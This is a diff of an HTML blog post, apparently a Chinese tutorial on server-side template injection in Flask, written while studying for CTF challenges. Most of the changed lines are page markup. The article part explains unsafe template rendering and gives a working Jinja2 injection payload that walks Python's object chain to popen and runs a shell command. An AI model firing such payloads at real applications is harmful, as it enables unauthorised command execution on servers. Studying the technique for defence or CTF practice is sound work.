@@ -1,11 +1,12 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
-    <head>
-        <meta charset="utf-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1">
-        <meta name="robots" content="noodp" />
-        <title>SSTI_OF_FLASK - Huamang&#39;s Blog</title><meta name="Description" content="Huamang&#39;s Blog"><meta property="og:title" content="SSTI_OF_FLASK" />
-<meta property="og:description" content="前言 之前一直是套着公式去做ssti的题目，遇到需要一些变化的，可能就会卡住了，所以这里打算学习并梳理一下关于Python中SSTI的知识点 Flask" />
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title class="pjax-title">SSTI_OF_FLASK - Huamang&#39;s Blog</title><meta name="Description" content="Huamang&#39;s Blog"><meta property="og:title" content="SSTI_OF_FLASK" />
+<meta property="og:description" content="前言之前一直是套着公式去做ssti的题目，遇到需要一些变化的，可能就会卡住了，所以这里打算学习并梳理一下关于Python中SSTI的知识点 F" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://example.com/ssti/" /><meta property="og:image" content="https://example.com/logo.png"/><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2022-09-19T02:09:13+08:00" />
@@ -15,11 +16,15 @@
 <meta name="twitter:image" content="https://example.com/logo.png"/>
 
 <meta name="twitter:title" content="SSTI_OF_FLASK"/>
-<meta name="twitter:description" content="前言 之前一直是套着公式去做ssti的题目，遇到需要一些变化的，可能就会卡住了，所以这里打算学习并梳理一下关于Python中SSTI的知识点 Flask"/>
+<meta name="twitter:description" content="前言之前一直是套着公式去做ssti的题目，遇到需要一些变化的，可能就会卡住了，所以这里打算学习并梳理一下关于Python中SSTI的知识点 F"/>
 <meta name="application-name" content="LoveIt">
-<meta name="apple-mobile-web-app-title" content="LoveIt"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+<meta name="apple-mobile-web-app-title" content="LoveIt">
+
+<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
         <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://example.com/ssti/" /><link rel="prev" href="https://example.com/qwb2022/" /><link rel="next" href="https://example.com/java%E5%AE%89%E5%85%A8_rmi/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"><script type="application/ld+json">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://example.com/ssti/" /><link rel="prev" href="https://example.com/qwb2022/" /><link rel="next" href="https://example.com/java%E5%AE%89%E5%85%A8_rmi/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
     {
         "@context": "http://schema.org",
         "@type": "BlogPosting",
@@ -28,7 +33,7 @@
         "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "https:\/\/example.com\/ssti\/"
-        },"image": ["https:\/\/example.com\/images\/Apple-Devices-Preview.png"],"genre": "posts","wordcount":  2877 ,
+        },"image": ["https:\/\/example.com\/images\/Apple-Devices-Preview.png"],"genre": "posts","wordcount":  2950 ,
         "url": "https:\/\/example.com\/ssti\/","datePublished": "2022-09-19T02:09:13+08:00","dateModified": "2022-09-19T02:09:13+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
             "@type": "Organization",
             "name": "xxxx","logo": {
@@ -42,31 +47,38 @@
             },"description": ""
     }
     </script></head>
-    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
 
-        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark');}
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('dark' === 'light' || 'dark' === 'dark' || 'dark' === 'black') setTheme('dark'), saveTheme('dark'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
     <div class="header-wrapper">
         <div class="header-title">
             <a href="/" title="Huamang&#39;s Blog"><span class="header-title-pre"><i class='far fa-kiss-wink-heart fa-fw' aria-hidden='true'></i></span>Huamang&#39;s Blog</a>
         </div>
         <div class="menu">
-            <div class="menu-inner"><a class="menu-item" href="/posts/"> 所有文章 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/friends/"> 友链 </a><a class="menu-item" href="/about/"> 关于 </a><a class="menu-item" href="https://github.com/huamang" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw' aria-hidden='true'></i>  </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item language" title="选择语言">简体中文<i class="fas fa-chevron-right fa-fw" aria-hidden="true"></i>
-                        <select class="language-select" id="language-select-desktop" onchange="location = this.value;"><option value="/ssti/" selected>简体中文</option></select>
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 所有文章 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/friends/"> 友链 </a><a class="menu-item" href="/about/"> 关于 </a><a class="menu-item" href="https://github.com/huamang" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw' aria-hidden='true'></i>  </a><span class="menu-item delimiter"></span><a href="#" onclick="return false;" class="menu-item language" title="选择语言">简体中文<i class="fas fa-chevron-right fa-fw"></i>
+                        <select class="language-select" title="Select Language" id="language-select-desktop" onchange="location = this.value;"><option value="/ssti/" selected>简体中文</option></select>
                     </a><span class="menu-item search" id="search-desktop">
                         <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
-                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
-                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        <a href="#" onclick="return false;" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
                         </a>
-                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
-                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        <a href="#" onclick="return false;" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
                         </a>
                         <span class="search-button search-loading" id="search-loading-desktop">
-                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
                         </span>
-                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
-                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
-                </a>
-            </div>
+                    </span><a href="#" onclick="return false;" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a></div>
         </div>
     </div>
 </header><header class="mobile" id="header-mobile">
@@ -82,46 +94,102 @@
         <div class="menu" id="menu-mobile"><div class="search-wrapper">
                     <div class="search mobile" id="search-mobile">
                         <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
-                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
-                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        <a href="#" onclick="return false;" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
                         </a>
-                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
-                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        <a href="#" onclick="return false;" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
                         </a>
                         <span class="search-button search-loading" id="search-loading-mobile">
-                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
                         </span>
                     </div>
-                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                    <a href="#" onclick="return false;" class="search-cancel" id="search-cancel-mobile">
                         取消
                     </a>
-                </div><a class="menu-item" href="/posts/" title="">所有文章</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/friends/" title="">友链</a><a class="menu-item" href="/about/" title="">关于</a><a class="menu-item" href="https://github.com/huamang" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw' aria-hidden='true'></i></a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
-                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
-            </a><a href="javascript:void(0);" class="menu-item" title="选择语言">简体中文<i class="fas fa-chevron-right fa-fw" aria-hidden="true"></i>
-                    <select class="language-select" onchange="location = this.value;"><option value="/ssti/" selected>简体中文</option></select>
+                </div><a class="menu-item" href="/posts/" title="">所有文章</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/friends/" title="">友链</a><a class="menu-item" href="/about/" title="">关于</a><a class="menu-item" href="https://github.com/huamang" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw' aria-hidden='true'></i></a><a href="#" onclick="return false;" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a><a href="#" onclick="return false;" class="menu-item" title="选择语言">简体中文<i class="fas fa-chevron-right fa-fw"></i>
+                    <select class="language-select" title="Select Language" onchange="location = this.value;"><option value="/ssti/" selected>简体中文</option></select>
                 </a></div>
     </div>
-</header><div class="search-dropdown desktop">
-        <div id="search-dropdown-desktop"></div>
-    </div>
-    <div class="search-dropdown mobile">
-        <div id="search-dropdown-mobile"></div>
-    </div><main class="main">
-                <div class="container"><div class="toc" id="toc-auto">
-            <h2 class="toc-title">目录</h2>
-            <div class="toc-content always-active" id="toc-content-auto"></div>
-        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">SSTI_OF_FLASK</h1><div class="post-meta">
-            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Huamang</a>
-</span>&nbsp;<span class="post-category">收录于 <a href="/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>技术分享</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-09-19">2022-09-19</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;约 2877 字&nbsp;
-                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;预计阅读 6 分钟&nbsp;<i class="far fa-eye fa-fw"></i>
-                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-                <span id="busuanzi_container_site_pv">访问量<span id="busuanzi_value_site_pv"></span>次</span>
-            </div>
-        </div><div class="details toc" id="toc-static"  data-kept="">
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+            <div class="container"><div class="toc" id="toc-auto">
+        <h2 class="toc-title">目录</h2>
+        <div class="toc-content always-active" id="toc-content-auto"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#flask">Flask</a></li>
+    <li><a href="#攻击原理">攻击原理</a></li>
+    <li><a href="#利用">利用</a>
+      <ul>
+        <li><a href="#找利用链">找利用链</a></li>
+        <li><a href="#rce">RCE</a>
+          <ul>
+            <li><a href="#eval">eval</a></li>
+            <li><a href="#os模块">os模块</a></li>
+            <li><a href="#subprocesspopen类">subprocess.popen类</a></li>
+            <li><a href="#linecache-函数">linecache 函数</a></li>
+            <li><a href="#lipsum">lipsum</a></li>
+          </ul>
+        </li>
+        <li><a href="#文件读取">文件读取</a></li>
+      </ul>
+    </li>
+    <li><a href="#bypass">Bypass</a>
+      <ul>
+        <li><a href="#heading">{{</a></li>
+        <li><a href="#heading-1">[]</a>
+          <ul>
+            <li><a href="#getitem">getitem</a></li>
+            <li><a href="#pop">pop</a></li>
+            <li><a href="#字典">字典</a></li>
+          </ul>
+        </li>
+        <li><a href="#_">_</a></li>
+        <li><a href="#引号">引号'</a>
+          <ul>
+            <li><a href="#利用chr绕过">利用chr()绕过</a></li>
+            <li><a href="#利用request对象绕过">利用request对象绕过</a></li>
+          </ul>
+        </li>
+        <li><a href="#点">点.</a>
+          <ul>
+            <li><a href="#利用-attr-绕过适用于flask">利用 <code>|attr()</code> 绕过（适用于flask）</a></li>
+            <li><a href="#利用中括号-绕过">利用中括号[ ]绕过</a></li>
+          </ul>
+        </li>
+        <li><a href="#组合绕过">组合绕过</a>
+          <ul>
+            <li><a href="#--">. + []</a></li>
+            <li><a href="#__-">__ +.+[]</a></li>
+            <li><a href="#heading-2">&lsquo;+&quot;</a></li>
+            <li><a href="#_-1">_+'+&quot;</a></li>
+            <li><a href="#_--">_ +. +&rsquo;</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#参考文章">参考文章</a></li>
+  </ul>
+</nav></div>
+    </div><script>document.getElementsByTagName("main")[0].setAttribute("pageStyle", "normal")</script><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">SSTI_OF_FLASK</h1><div class="post-meta">
+            <div class="post-meta-line">
+                <span class="post-author"><i class="author fas fa-user-circle fa-fw"></i><a href="/" title="Author" rel=" author" class="author">Huamang</a>
+                </span>&nbsp;<span class="post-category">收录于 </span>&nbsp;<span class="post-category">类别 <a href="/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"><i class="far fa-folder fa-fw"></i>技术分享</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2022-09-19">2022-09-19</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2022-09-19">2022-09-19</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 2950 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 6 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
                 <div class="details-summary toc-title">
                     <span>目录</span>
-                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
                 </div>
                 <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
   <ul>
@@ -180,10 +248,10 @@
     <li><a href="#参考文章">参考文章</a></li>
   </ul>
 </nav></div>
-            </div><div class="content" id="content"><h1 id="前言">前言</h1>
-<p>之前一直是套着公式去做ssti的题目，遇到需要一些变化的，可能就会卡住了，所以这里打算学习并梳理一下关于Python中SSTI的知识点</p>
-<h1 id="flask">Flask</h1>
-<p>首先，是python是SSTI，那么就离不开flask，这里用一个简单的flask demo来介绍一下他的模板渲染</p>
+            </div><div class="content" id="content"><h1 id="前言" class="headerLink">
+    <a href="#%e5%89%8d%e8%a8%80" class="header-mark"></a>前言</h1><p>之前一直是套着公式去做ssti的题目，遇到需要一些变化的，可能就会卡住了，所以这里打算学习并梳理一下关于Python中SSTI的知识点</p>
+<h1 id="flask" class="headerLink">
+    <a href="#flask" class="header-mark"></a>Flask</h1><p>首先，是python是SSTI，那么就离不开flask，这里用一个简单的flask demo来介绍一下他的模板渲染</p>
 <p>构造如下的代码，以及目录结构</p>
 <p>目录结构</p>
 <div class="highlight"><div class="chroma">
@@ -255,14 +323,14 @@
 </code></pre></td></tr></table>
 </div>
 </div><p>可以看到这里是已经可以进行模板的渲染了，但是我们的<code>{{7*7}}</code>没有被渲染，这是因为这是正确的写法，并不存在SSTI漏洞</p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://tuchuang.huamang.xyz/img/image-20220723210736546.png"
-        data-srcset="https://tuchuang.huamang.xyz/img/image-20220723210736546.png, https://tuchuang.huamang.xyz/img/image-20220723210736546.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220723210736546.png 2x"
-        data-sizes="auto"
-        alt="https://tuchuang.huamang.xyz/img/image-20220723210736546.png"
-        title="image-20220723210736546" /></p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20220723210736546.png" title="image-20220723210736546" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20220723210736546.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20220723210736546.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20220723210736546.png, https://tuchuang.huamang.xyz/img/image-20220723210736546.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220723210736546.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20220723210736546.png">
+    </a></p>
 <p>而什么情况才会存在SSTI的漏洞呢，很多很多的安全漏洞都源于程序员偷懒的不规范代码，这里也是，假如有个很小的功能点但是开发者不愿意创建一个html文件，选择直接用字符串插入html的话，那么漏洞可能就来了,比如下面这个demo</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -289,16 +357,16 @@ def test():
 </code></pre></td></tr></table>
 </div>
 </div><p>可以看到，这里是成功解析了的</p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://tuchuang.huamang.xyz/img/image-20220723212821812.png"
-        data-srcset="https://tuchuang.huamang.xyz/img/image-20220723212821812.png, https://tuchuang.huamang.xyz/img/image-20220723212821812.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220723212821812.png 2x"
-        data-sizes="auto"
-        alt="https://tuchuang.huamang.xyz/img/image-20220723212821812.png"
-        title="image-20220723212821812" /></p>
-<h1 id="攻击原理">攻击原理</h1>
-<p>那么知道了漏洞存在了以后，我们改怎么利用，我们把最终的目标放在RCE，那么我们怎么才能在双大括号里面RCE，这就得从python语言来说起了，这里先给出几个核心的方法</p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20220723212821812.png" title="image-20220723212821812" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20220723212821812.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20220723212821812.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20220723212821812.png, https://tuchuang.huamang.xyz/img/image-20220723212821812.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220723212821812.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20220723212821812.png">
+    </a></p>
+<h1 id="攻击原理" class="headerLink">
+    <a href="#%e6%94%bb%e5%87%bb%e5%8e%9f%e7%90%86" class="header-mark"></a>攻击原理</h1><p>那么知道了漏洞存在了以后，我们改怎么利用，我们把最终的目标放在RCE，那么我们怎么才能在双大括号里面RCE，这就得从python语言来说起了，这里先给出几个核心的方法</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -323,60 +391,60 @@ __builtins__  是一个包含了大量内置函数的一个模块
 </div>
 </div><p>python中所有的类的基类，都是object，我们可以这样获取类</p>
 <p><strong>xx.__class__</strong>，例如字符串，元组，列表</p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://tuchuang.huamang.xyz/img/image-20220723224813292.png"
-        data-srcset="https://tuchuang.huamang.xyz/img/image-20220723224813292.png, https://tuchuang.huamang.xyz/img/image-20220723224813292.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220723224813292.png 2x"
-        data-sizes="auto"
-        alt="https://tuchuang.huamang.xyz/img/image-20220723224813292.png"
-        title="image-20220723224813292" /></p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20220723224813292.png" title="image-20220723224813292" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20220723224813292.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20220723224813292.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20220723224813292.png, https://tuchuang.huamang.xyz/img/image-20220723224813292.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220723224813292.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20220723224813292.png">
+    </a></p>
 <p>在python中每个类都有一个<strong>bases</strong>属性，这个的意思就是<strong>基类</strong>，也就是之前提到的object</p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://tuchuang.huamang.xyz/img/image-20220723231849079.png"
-        data-srcset="https://tuchuang.huamang.xyz/img/image-20220723231849079.png, https://tuchuang.huamang.xyz/img/image-20220723231849079.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220723231849079.png 2x"
-        data-sizes="auto"
-        alt="https://tuchuang.huamang.xyz/img/image-20220723231849079.png"
-        title="image-20220723231849079" /></p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20220723231849079.png" title="image-20220723231849079" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20220723231849079.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20220723231849079.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20220723231849079.png, https://tuchuang.huamang.xyz/img/image-20220723231849079.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220723231849079.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20220723231849079.png">
+    </a></p>
 <p>拿到基层的object，我们就可以往其他的方向去发展了，这里就用到了一个<strong>subclasses</strong>() 方法，他的作用是：返回的是这个类的子类的集合，也就是object类的子类的集合</p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://tuchuang.huamang.xyz/img/image-20220723234404088.png"
-        data-srcset="https://tuchuang.huamang.xyz/img/image-20220723234404088.png, https://tuchuang.huamang.xyz/img/image-20220723234404088.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220723234404088.png 2x"
-        data-sizes="auto"
-        alt="https://tuchuang.huamang.xyz/img/image-20220723234404088.png"
-        title="image-20220723234404088" /></p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20220723234404088.png" title="image-20220723234404088" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20220723234404088.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20220723234404088.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20220723234404088.png, https://tuchuang.huamang.xyz/img/image-20220723234404088.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220723234404088.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20220723234404088.png">
+    </a></p>
 <p>那么就可以供我们挑选了，我们找到可以利用的类，选中来利用，例如这里的&lt;class &lsquo;os._wrap_close&rsquo;&gt;</p>
 <p>不同版本的python可能会在不用的位置，我的环境里是<code>&quot;&quot;.__class__.__bases__[0].__subclasses__()[133]</code></p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://tuchuang.huamang.xyz/img/image-20220723235402485.png"
-        data-srcset="https://tuchuang.huamang.xyz/img/image-20220723235402485.png, https://tuchuang.huamang.xyz/img/image-20220723235402485.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220723235402485.png 2x"
-        data-sizes="auto"
-        alt="https://tuchuang.huamang.xyz/img/image-20220723235402485.png"
-        title="image-20220723235402485" /></p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20220723235402485.png" title="image-20220723235402485" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20220723235402485.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20220723235402485.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20220723235402485.png, https://tuchuang.huamang.xyz/img/image-20220723235402485.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220723235402485.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20220723235402485.png">
+    </a></p>
 <p>这里就到了下一个点，<code>.init.globals</code>，这个init用来初始化类，globals用来全局查找所有方法和变量及参数</p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://tuchuang.huamang.xyz/img/image-20220723235527394.png"
-        data-srcset="https://tuchuang.huamang.xyz/img/image-20220723235527394.png, https://tuchuang.huamang.xyz/img/image-20220723235527394.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220723235527394.png 2x"
-        data-sizes="auto"
-        alt="https://tuchuang.huamang.xyz/img/image-20220723235527394.png"
-        title="image-20220723235527394" /></p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20220723235527394.png" title="image-20220723235527394" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20220723235527394.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20220723235527394.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20220723235527394.png, https://tuchuang.huamang.xyz/img/image-20220723235527394.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220723235527394.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20220723235527394.png">
+    </a></p>
 <p>可以发现，这里是有popen的，这个就可以命令执行了</p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://tuchuang.huamang.xyz/img/image-20220723235628539.png"
-        data-srcset="https://tuchuang.huamang.xyz/img/image-20220723235628539.png, https://tuchuang.huamang.xyz/img/image-20220723235628539.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220723235628539.png 2x"
-        data-sizes="auto"
-        alt="https://tuchuang.huamang.xyz/img/image-20220723235628539.png"
-        title="image-20220723235628539" /></p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20220723235628539.png" title="image-20220723235628539" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20220723235628539.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20220723235628539.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20220723235628539.png, https://tuchuang.huamang.xyz/img/image-20220723235628539.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220723235628539.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20220723235628539.png">
+    </a></p>
 <p>这样就可以rce了</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -386,27 +454,27 @@ __builtins__  是一个包含了大量内置函数的一个模块
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">{{&#34;&#34;.__class__.__bases__[0].__subclasses__()[133].__init__.__globals__[&#39;popen&#39;](&#39;ls&#39;).read()}}
 </code></pre></td></tr></table>
 </div>
-</div><p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://tuchuang.huamang.xyz/img/image-20220723235742273.png"
-        data-srcset="https://tuchuang.huamang.xyz/img/image-20220723235742273.png, https://tuchuang.huamang.xyz/img/image-20220723235742273.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220723235742273.png 2x"
